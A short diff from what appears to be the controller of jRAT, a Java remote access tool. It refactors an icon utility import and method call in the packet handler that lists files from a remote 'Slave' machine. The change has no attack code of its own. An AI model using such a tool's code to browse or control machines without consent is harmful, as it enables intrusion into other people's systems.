@@ -1,5 +1,7 @@
 package se.jrat.controller.packets.incoming;
 
+import iconlib.FileIconUtils;
+
 import java.io.DataInputStream;
 import java.util.ArrayList;
 import java.util.List;
@@ -7,7 +9,6 @@ import java.util.List;
 import se.jrat.controller.Slave;
 import se.jrat.controller.io.FileObject;
 import se.jrat.controller.ui.frames.FrameRemoteFiles;
-import se.jrat.controller.utils.IconUtils;
 
 
 public class Packet22ListFiles extends AbstractIncomingPacket {
@@ -28,7 +29,7 @@ public class Packet22ListFiles extends AbstractIncomingPacket {
 			boolean hidden = dis.readBoolean();
 			
 			fo.setHidden(hidden);
-			fo.setIcon(IconUtils.getFileIconFromExtension(path, dir));
+			fo.setIcon(FileIconUtils.getIconFromExtension(path, dir));
 			
 			if (dir) {
 				dirs.add(fo);
